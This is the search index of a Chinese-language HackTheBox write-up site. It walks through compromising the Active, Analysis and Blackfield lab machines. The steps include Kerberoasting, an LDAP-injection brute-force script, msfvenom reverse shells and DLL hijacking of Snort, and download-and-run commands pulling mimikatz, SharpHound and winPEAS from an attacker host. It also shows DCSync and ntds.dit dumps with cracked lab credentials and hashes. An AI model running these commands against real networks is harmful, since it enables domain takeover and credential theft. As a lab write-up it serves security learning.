{"config": {"lang": ["en"], "separator": "[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+", "pipeline": ["stemmer"]}, "docs": [{"location": "", "title": "Home", "text": "<p>\u770b\u4e0d\u60ef\u522b\u4eba\u7684 Write-up\uff0c\u90a3\u5c31\u53ea\u597d\u81ea\u5df1\u5199\u4e86~</p> <ul> <li> <p> Hackthebox</p> </li> <li> <p> Tryhackme</p> </li> </ul>"}, {"location": "HackTheBox/", "title": "Index", "text": "<ul> <li>HackTheBox<ul> <li>Machines</li> <li>Challenges<ul> <li>Misc</li> <li>Web</li> <li>Crypto</li> <li>Reverse</li> <li>Pwn</li> </ul> </li> <li>Sherlocks</li> </ul> </li> </ul>"}, {"location": "HackTheBox/Machines/Active/", "title": "Active", "text": ""}, {"location": "HackTheBox/Machines/Active/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.100</p> <ul> <li><code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code></li> </ul> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-11 13:22:10Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  msrpc         Microsoft Windows RPC\n49171/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 (95%), Microsoft Windows 7 or Windows Server 2008 R2 (94%), Microsoft Windows Server 2008 R2 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (93%), Microsoft Windows Server 2008 SP1 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2024-01-11T13:23:21\n|_  start_date: 2024-01-11T00:12:28\n|_clock-skew: -23s\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled and required\n</code></pre> <ul> <li><code>ldapsearch</code></li> </ul> <pre><code>ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\ndn:\nnamingContexts: DC=active,DC=htb\nnamingContexts: CN=Configuration,DC=active,DC=htb\nnamingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb\nnamingContexts: DC=DomainDnsZones,DC=active,DC=htb\nnamingContexts: DC=ForestDnsZones,DC=active,DC=htb\n\nldapsearch -H \"ldap://$IP\" -x -b \"DC=active,DC=htb\"\n---\nNull\n</code></pre> <ul> <li>enum4linux</li> </ul> <p> \u53d1\u73b0\u90e8\u5206 SMB Shares - <code>smbclient //10.10.10.100/Replication</code></p> <p> </p> <p>\u53d1\u73b0\u4e864\u4e2a\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u8d26\u6237 <code>active.htb\\SVC_TGS</code> \u548c\u88ab\u52a0\u5bc6\u7684\u5bc6\u7801\uff1a <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>"}, {"location": "HackTheBox/Machines/Active/#shell-as-user-svc_tgs", "title": "Shell as User - SVC_TGS", "text": "<p> \u662f AES-256 \u52a0\u5bc6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>gpp-decrypt</code> \u89e3\u5bc6  <code>active.htb/SVC_TGS:GPPstillStandingStrong2k18</code></p> <ul> <li>\u7ee7\u7eed\u679a\u4e3e Samba Shares</li> </ul> <pre><code>crackmapexec smb $IP -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares\n---\nSMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nSMB         10.10.10.100    445    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 \nSMB         10.10.10.100    445    DC               [+] Enumerated shares\nSMB         10.10.10.100    445    DC               Share           Permissions     Remark\nSMB         10.10.10.100    445    DC               -----           -----------     ------\nSMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin\nSMB         10.10.10.100    445    DC               C$                              Default share\nSMB         10.10.10.100    445    DC               IPC$                            Remote IPC\nSMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share \nSMB         10.10.10.100    445    DC               Replication     READ            \nSMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share \nSMB         10.10.10.100    445    DC               Users           READ\n</code></pre> <ul> <li>\u627e\u5230 Users \u76ee\u5f55</li> </ul> <p></p> <ul> <li>\u905b\u72d7</li> </ul> <p> \u4f46\u662f\u6ca1 shell\uff0c\u64cd\u4f5c\u4e0d\u4e86</p>"}, {"location": "HackTheBox/Machines/Active/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>\u67e5\u770b\u8bbe\u7f6e\u4e86 SPN \u7684\u8d26\u6237\uff0c\u53d1\u73b0 administrator</li> </ul> <p><pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $IP -dc-host DC.active.htb\n</code></pre> </p> <ul> <li>\u5c1d\u8bd5 Kerberoasting \u83b7\u53d6\u670d\u52a1 Hash</li> </ul> <p><pre><code>impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $IP -dc-host DC.active.htb -request\n</code></pre>  - \u7206\u7834 Hash <pre><code>hashcat -m 13100 hash.list /usr/share/wordlists/rockyou.txt\n---\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ab13391da2a1d4d8992ba3d12d3927ef$26a5ea21be878ceff5464e9c76c032fac700d4ec0b10566a55fdefbf7c629fa1c63e2b6c10a34e6517e704b3cd9909493a6944f60416772d662d7284c2d5733cc3fa0fda0819dcda9f581e7a3d5fad7227966886ee1349e01c297c1e3656e02a1d790ec71161c80d5d4143d84975fa67512ab2f17acd0d4a2104744d4c576d7e207460ddd6a9f754123176ea901f33c0b3f58e64658c81b81df8f996f44b764e7970ae9d265032925db343bfac983471b6b8690319e8d8c8cfa2709ff2e19b458a20d5524ca25dbefd49ebf24625ffcc8707e2d0578e418fba6ab474c428f26c853126f8901a733540577a7f739f425ee1683b51b5b32de021b2facbc1f04292d8a5bb35c03c7541f6d95cc939ddc198612d88ef9df6d20e20651d2cc48b10edfc3ec470ddd7488b42ffeb92b0bc733c5120273b0a600fee4cda1777042d88b5376ea32176dfbb405165824fdcb5715db92521599469a137c41fffe5e079985a7646ea6859b4c5a656bc8ef4c6aea250f8eafcc080e4a039146e474dab7f18221d518ae85381596aefc231b72df63e92935c483addbc4b2e6cb49be7162526cc30cc78bbe6e638115188ccee8a20d3d10fe3e5604567d6908d92ab09054ab8c46172438dc964c7075749bf4a94122e7dc6bd0cd2dd737c194fbc671d087a36fcd84d1f500377970246036e8deab3712977d8615deb600f38a27253a908d9544b9dff17a7dbdd36e5c70c6b2a99814f822c6b74d1a3646f88ce93a391f3e384ac81fe142dce20bf2273e457d74c7184ff1e0799473139ea7e1dd18c293819b922a66b8d5b0872f352cba575cee04fda5ee9f834c470051aa6e4d083411a092923d23334f13550437cbd92fd6da6d5cd322fa321c379e89535685110027522852e7e1ee79350ced72ec807cab49afd0c8b8c9c607f665c43d318f4a22135f20a33da060aa5ee8914d5e59c143bfe64e3f95c2497ea613e7d7eb42650709bc77feb4e66fc26cde267c5332a1d015ec0095d3eacf1ce016778db78df448e22a113bbe11f151cce087c2dff879de0a6b305caf0bcb3f36b63e97a7b4079972395c472c6ae3bd4b72b6f6efae046a69dcf6bc5cd370d366c4f89ee0dc41d0aa95231a994764e2d45e61a5720d20cec8b5fe12548527143b187b4eda59cc94ec2729d29ea0424dce5a2c8f459fe23f3957a6bd4f08883932867fdf8f29b2b805f9a769f479f2a1f7d2029aeea8fa44c891bf6089947580f2a707747bf7f:Ticketmaster1968\n</code></pre></p> <ul> <li><code>Administrator:Ticketmaster1968</code></li> </ul> <p></p>"}, {"location": "HackTheBox/Machines/Active/#dump-hash", "title": "Dump Hash", "text": "<pre><code>powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.18/mimikatz.exe','C:\\Windows\\Temp\\mimikatz.exe')\nC:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::dcsync /domain:active.htb /all /csv\" exit\n--- Local\nAdministrator:5c15eb37006fb74c21a5d1e2144b726e\n--- Domain\n502     krbtgt          b889e0d47d6fe22c8f0463a717f460dc        514\n500     Administrator   5ffb4aaaf9b63dc519eca04aec0e8bed        66048\n1000    DC$             ad785e2162b240a84dc409c0a4555b0a        532480\n1103    SVC_TGS         f54f3a1d3c38140684ff4dad029f25b5        66048\n</code></pre>"}, {"location": "HackTheBox/Machines/Analysis/", "title": "Analysis", "text": ""}, {"location": "HackTheBox/Machines/Analysis/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.11.250</p>"}, {"location": "HackTheBox/Machines/Analysis/#nmap", "title": "Nmap", "text": "<ul> <li>Tcp Scan</li> </ul> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-21 02:04:15Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3306/tcp  open  mysql         MySQL (unauthorized)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n33060/tcp open  mysqlx?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: \n|     Invalid message\"\n|     HY000\n|   oracle-tns: \n|     Invalid message-frame.\"\n|_    HY000\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  msrpc         Microsoft Windows RPC\n49675/tcp open  msrpc         Microsoft Windows RPC\n49692/tcp open  msrpc         Microsoft Windows RPC\n49705/tcp open  msrpc         Microsoft Windows RPC\n49846/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port33060-TCP:V=7.94SVN%I=7%D=1/21%Time=65AC7BC5%P=x86_64-pc-linux-gnu%\n...\nSF:5\\0\\0\\0\\x0b\\x08\\x05\\x1a\\0\\x1e\\0\\0\\0\\x01\\x08\\x01\\x10\\x88'\\x1a\\x0fInvalid\nSF:\\x20message\\\"\\x05HY000\");\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -34s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-21T02:05:24\n|_  start_date: N/A\n</code></pre>"}, {"location": "HackTheBox/Machines/Analysis/#smb", "title": "Smb", "text": ""}, {"location": "HackTheBox/Machines/Analysis/#ldap", "title": "Ldap", "text": ""}, {"location": "HackTheBox/Machines/Analysis/#rpc", "title": "Rpc", "text": ""}, {"location": "HackTheBox/Machines/Analysis/#web-analysishtb", "title": "Web -analysis.htb", "text": "<ul> <li><code>feroxbuster -u http://analysis.htb/ -d 1</code> \u53d1\u73b0 bat \u76ee\u5f55</li> </ul> <ul> <li><code>feroxbuster -u http://analysis.htb/ -d 1 -X bat,txt,aspx,asp</code></li> </ul> <p>\u65e0\u4ef7\u503c</p> <ul> <li>HTML Source Code - analysis.htb</li> </ul> <p></p> <p>\u53d1\u73b0\u7528\u6237\u540d\uff1apleazkin</p>"}, {"location": "HackTheBox/Machines/Analysis/#dns", "title": "DNS", "text": "<p>\u65e0 Web \u7684\u57df\u540d\u54cd\u5e94 404</p> <p></p> <p>\u53d1\u73b0\u4e00\u4e2a\u54cd\u5e94 403 \u7684\u5b50\u57df</p>"}, {"location": "HackTheBox/Machines/Analysis/#web-internalanalysishtb", "title": "Web - internal.analysis.htb", "text": "<ul> <li><code>feroxbuster -u http://internal.analysis.htb/ -X php</code></li> </ul> <p>\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u7528\u7684\u63a5\u53e3</p> <ul> <li><code>/list.php?name=technician)(description=</code> \u5b58\u5728 ldap \u6ce8\u5165</li> </ul> <p></p> <ul> <li>Fuzz \u53ef\u7528\u5b57\u6bb5</li> </ul> <p></p> <p></p> <p></p>"}, {"location": "HackTheBox/Machines/Analysis/#shell-as-user-src_web", "title": "Shell as User - src_web", "text": "<ul> <li>\u5199\u4e2a\u811a\u672c\u7206\u7834 description</li> </ul> <pre><code>import string\nimport httpx\nfrom urllib.parse import quote\n\nURL = 'http://internal.analysis.htb/users/list.php?name=technician)(description={}'\nDES = ''\nstrs = string.printable\nflag = 1\n\nwhile flag:\n    flag -= 1\n    for i in strs:\n        if i == strs[-1]:\n            flag = 0\n        des = DES + i + '*'\n        url = URL.format(quote(des))\n        res = httpx.get(url)\n        print('\\r\\r[+]', des, res.status_code, len(res.text), flush=True, end='')\n        if len(res.text) \uff01= [406, 8]:\n            flag += 1\n            break\n    DES += i\n    print('\\r\\r[+]', DES)\n\nprint(DES)\n</code></pre> <ul> <li>\u8dd1\u4e00\u534a\u505c\u4e86\uff0c\u53d1\u73b0\u5b57\u7b26\u4e2d\u6709 *</li> </ul> <ul> <li>\u5c1d\u8bd5\u767b\u5f55 - \u5bc6\u7801\u9519\u8bef</li> </ul> <ul> <li>\u53ef\u4ee5\u770b\u5230\u76f4\u63a5\u7528\u4e24\u4e2a * \u662f\u5931\u8d25\u7684</li> </ul> <ul> <li>\u4f46\u662f\u53ef\u4ee5\u5728\u5b57\u7b26\u4e2d\u95f4\u63d2\u5165 *\uff0c\u9996\u5148\u731c\u6d4b\u6b64\u65f6\u7684\u5b57\u7b26\u4e3a *</li> </ul> <ul> <li>\u7ee7\u7eed\u679a\u4e3e</li> </ul> <ul> <li>\u767b\u5f55\u6210\u529f\uff0c<code>technician/97NTtl*4QP96Bv</code> \u770b\u5230\u4e00\u4e2a\u6c99\u7bb1\u73af\u5883</li> </ul> <p>\u751f\u6210 Revese Shell \u5c1d\u8bd5 </p> <p><code>msfvenom -p windows/x64/shell_reverse_tcp x86/shikata_ga_nai -i 16 -f exe -o good.exe LHOST=10.10.16.7 LPORT=2233</code></p> <ul> <li>\u6ca1\u4ec0\u4e48\u53cd\u5e94\uff0c\u6539\u6210 PHP \u9a6c\u5b50\u8bd5\u8bd5</li> </ul> <p></p> <p></p> <ul> <li>\u7528 Powershell \u53cd\u5f39\u4e2a Shell</li> </ul> <p></p> <ul> <li>\u67e5\u770b\u6240\u6709\u7528\u6237</li> </ul> <p></p> <ul> <li>\u905b\u4e00\u4e0b\u72d7</li> </ul> <pre><code>powershell -c \"IEX(New-Object Net.Webclient).downloadstring('http://10.10.16.7/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All\"\n# \u590d\u5236\u5230 Web \u76ee\u5f55\u4e0b\u8f7d\ncp 20240121130416_BloodHound.zip C:\\inetpub\\internal\\dashboard\\uploads\\20240121130416_BloodHound.zip\n</code></pre> <p>\u4ece src_web \u6ca1\u5565\u6709\u4ef7\u503c\u7684\u8def\u5f84</p> <ul> <li>\u8dd1\u4e00\u4e0b winpeas</li> </ul> <pre><code>wget http://10.10.16.7/winPEASx64.exe -O winpeas.exe\n./winpeas.exe &gt; winpeas.log\ncp winpeas.log C:\\inetpub\\internal\\dashboard\\uploads\\winpeas.zip    # \u9700\u8981\u6539\u4e00\u4e0b\u6269\u5c55\u540d\n</code></pre> <ul> <li>\u53d1\u73b0 Mysql \u51ed\u636e</li> </ul> <p></p> <pre><code>db_master/0$TBO7H8s12yh&amp;\n</code></pre> <ul> <li>\u53d1\u73b0 ldap \u8d26\u53f7</li> </ul> <p></p> <p></p> <pre><code>webservice@analysis.htb/N1G6G46G@G!j\n</code></pre>"}, {"location": "HackTheBox/Machines/Analysis/#shell-as-user-jdoe", "title": "Shell as User - jdoe", "text": "<ul> <li>\u53d1\u73b0 jdoe \u51ed\u636e</li> </ul> <pre><code>jdoe/7y4Z4^*y9Zzj\n</code></pre> <ul> <li>\u767b\u5f55 jdoe</li> </ul> <ul> <li>\u679a\u4e3e\u6700\u65b0\u5199\u5165\u7684\u6587\u4ef6</li> </ul> <pre><code>(gci C:\\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,Length,FullName\n</code></pre> <p>\u4e00\u4e2a\u53ef\u7591\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u4f3c\u4e4e\u5728\u5468\u671f\u6027\u7684\u8fd0\u884c</p> <ul> <li>Google</li> </ul> <p></p> <p>\u53ef\u4ee5\u770b\u5230 snort \u4f1a\u5148\u52a0\u8f7d c:\\Snort\\lib\\snort_dynamicpreprocessor \u76ee\u5f55\u4e0b\u7684 dll\uff0c\u7136\u540e\u5728\u52a0\u8f7d c:\\Snort\\lib\\snort_dynamicengine\\sf_engine.dll \u6587\u4ef6</p> <p>\u6240\u4ee5\u53ef\u7591\u521b\u5efa <code>c:\\Snort\\lib\\snort_dynamicpreprocessor\\sf_engine.dll</code> \u6587\u4ef6\u6765\u52ab\u6301</p> <ul> <li>\u751f\u6210 Reverse Shell <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=2233 -f dll -o sf_engine.dll</code> \u4e0a\u4f20</li> </ul> <p></p> <p></p>"}, {"location": "HackTheBox/Machines/Analysis/#dump-hash", "title": "Dump Hash", "text": "<pre><code>curl http://10.10.16.7/mimikatz.exe -o m.exe\nm.exe \"lsadump::dcsync /domain:analysis.htb /all /csv\" exit\n---\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:analysis.htb /all /csv\n[DC] 'analysis.htb' will be the domain\n[DC] 'DC-ANALYSIS.analysis.htb' will be the DC server\n[DC] Exporting domain 'analysis.htb'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  8549ecd32b0253e9894a422299fe2466        514\n1105    cwilliams       ce88373ebd6d687eac0a405734a266aa        66048\n1106    technician      ce88373ebd6d687eac0a405734a266aa        66048\n1109    wsmith  3da4104738938858384180964346fc6c        66048\n1111    lzen    eea7337a28121aab144ca78fed48fc7e        66048\n1110    jangel  eea7337a28121aab144ca78fed48fc7e        66048\n2103    amanson 5d5b796cd37d9e19d9d1ae10c22ffa78        512\n2104    badam   5d5b796cd37d9e19d9d1ae10c22ffa78        512\n1104    soc_analyst     d6f020bbee8043520eb569e540913bd4        66048\n1000    DC-ANALYSIS$    2ec9198220c4bb7306ba170b7fa007f9        532480\n1103    jdoe    190193db2c6c6d69c60cf5af64447ce0        66048\n500     Administrateur  584d96946e4ad1ddfa4f8d7938faf91d        66048\n2101    svc_web cf74f3b0e86e17fba5051e261b9785b2        66048\n1107    webservice      780b446d7d76a85880ce49a387f18642        66048\n\nmimikatz(commandline) # exit\nBye!\n</code></pre>"}, {"location": "HackTheBox/Machines/Blackfield/", "title": "Blackfield", "text": ""}, {"location": "HackTheBox/Machines/Blackfield/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.192 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-12 10:45:02Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49676/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (89%)\nAggressive OS guesses: Microsoft Windows Server 2019 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 7h59m59s\n| smb2-time: \n|   date: 2024-01-12T10:46:11\n|_  start_date: N/A\n</code></pre> - <code>crackmapexec smb $IP -u guest -p '' --shares</code>  \u6ca1\u6709\u7ffb\u5230\u4ec0\u4e48\u53ef\u7528\u7684\u6587\u4ef6\u4fe1\u606f - <code>crackmapexec smb $IP -u guest -p '' --rid-brute 10000</code>  - \u7206\u51fa\u7684\u7528\u6237 <pre><code>Administrator\nDC01$ \nDnsAdmins \nDnsUpdateProxy \nGuest \nPC01$\nSRV-EXCHANGE$ \nSRV-FILE$ \nSRV-INTRANET$ \nSRV-WEB$  \naudit2020 \nkrbtgt \nlydericlefebvre \nsupport \nsvc_backup\n</code></pre>     - AS-REP Roasting \u5f97\u5230 <code>support@BLACKFIELD.LOCAL</code> Hash  - <code>ldapsearch -x -H \"ldap://$IP\" -s base namingContexts</code>  - <code>ldapsearch -x -H \"ldap://$IP\" -b \"DC=BLACKFIELD,DC=local\"</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-support", "title": "Shell as User - support", "text": "<ul> <li>\u7206\u7834 Hash <code>hashcat -m 18200 hash.list /usr/share/wordlists/rockyou.txt</code> </li> <li>\u5c1d\u8bd5\u767b\u5f55\u7528\u6237 <code>support:#00^BlackKnight</code>  \u63d0\u793a\u8ba4\u8bc1\u5931\u8d25</li> <li>\u67e5\u770b\u7528\u6237 samba \u6743\u9650  \u76ee\u5f55\u53ef\u8bfb\uff0c\u4f46\u662f\u6ca1\u4ec0\u4e48\u4e1c\u897f</li> </ul>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-audit2020", "title": "Shell as User - AUDIT2020", "text": "<ul> <li>\u905b\u72d7\uff0c\u53d1\u73b0\u53ef\u4ee5\u91cd\u7f6e\u5bc6\u7801  <p>https://www.thehacker.recipes/a-d/movement/dacl/forcechangepassword</p> </li> </ul> <p>  - bloodhound \u770b\u5230\u6ca1\u6709\u8fdc\u7a0b\u7ba1\u7406\u7684\u6743\u9650\uff0c\u53d1\u73b0\u65b0\u7684 samba \u76ee\u5f55  - <code>smbclient -U BLACKFIELD.local/AUDIT2020 //10.10.10.192/forensic</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#shell-as-user-svc_backup", "title": "Shell as User - svc_backup", "text": "<p>\u53d1\u73b0\u5185\u5b58 lsass \u76f8\u5173\u6587\u4ef6\uff0c\u5c1d\u8bd5 <code>pypykatz lsa minidump lsass.DMP</code> <pre><code>svc_backup:9658d1d1dcd9250115e2205d9f48400d\nadministrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n</code></pre> - \u7ecf\u8fc7\u5c1d\u8bd5 svc_backup \u53ef\u4ee5\u767b\u5f55  - \u62e5\u6709\u5907\u4efd\u6743\u9650\uff0c\u76f4\u63a5\u5907\u4efd <pre><code>reg save hklm\\system system.bak\nreg save hklm\\sam sam.bak\ndownload system.bak\ndownload sam.bak\n</code></pre></p> <p>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-attack - \u57df\u73af\u5883\u53ef\u4ee5\u4f7f\u7528 wbadmin.exe.exe \u6765 dump NTDS.dit  \u770b\u5230 svc_backup \u8d26\u6237\u53ef\u4ee5\u5199\u5165 samba/C$ <pre><code># \u521b\u5efa\u76ee\u5f55\u6302\u8f7d\u5230 V \u76d8\nnet use V: \\\\10.10.10.192\\C$\\temp2 /user:smbuser password\n# \u6d4b\u8bd5\necho test &gt; c:\\temp2\\test.txt\ndir v:\\\n\necho \"Y\" | wbadmin start backup -backuptarget:\\\\10.10.10.192\\C$\\temp2 -include:c:\\windows\\ntds\nwbadmin get versions\n# \u66f4\u6362\u4e0a\u9762\u770b\u5230\u7684\u7248\u672c\u65f6\u95f4\necho \"Y\" | wbadmin start recovery -version:01/12/2024-15:26 -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:C:\\temp2 -notrestoreacl\n</code></pre> \u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u5728 C:\\temp2 \u770b\u5230 ntds.dit  <code>impacket-secretsdump -sam sam.bak -system system.bak -ntds ntds.dit local</code>  - <code>evil-winrm -i 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'</code> </p>"}, {"location": "HackTheBox/Machines/Blackfield/#hash-dump", "title": "Hash dump", "text": "<pre><code>impacket-secretsdump -sam sam.bak -system system.bak -ntds ntds.dit local\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c\n[*] Reading and 